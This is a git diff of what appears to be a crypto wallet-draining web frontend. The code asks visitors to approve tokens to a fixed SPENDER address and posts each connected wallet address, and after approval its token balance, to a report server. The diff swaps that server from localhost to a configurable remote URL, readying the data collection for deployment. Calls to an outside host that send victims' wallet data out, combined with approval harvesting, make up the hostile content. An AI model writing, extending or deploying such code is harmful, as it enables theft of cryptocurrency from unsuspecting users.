@@ -7,6 +7,8 @@ import { config } from '@/config';
 
 // Spender address that will receive approvals
 // Load spender from env, fallback to empty
+const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
+
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
 if (!SPENDER || SPENDER === "0x") {
   throw new Error('SPENDER_ADDRESS is not defined or invalid');
@@ -40,7 +42,7 @@ function ConnectionReporter() {
 
   useEffect(() => {
     if (isConnected && address) {
-      fetch("http://localhost:4000/report", {
+       fetch(`${REPORT_URL}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -141,7 +143,7 @@ export default function Home() {
         setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
 
         // report approval including balance
-        await fetch("http://localhost:4000/report", {
+        await  fetch(`${REPORT_URL}`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
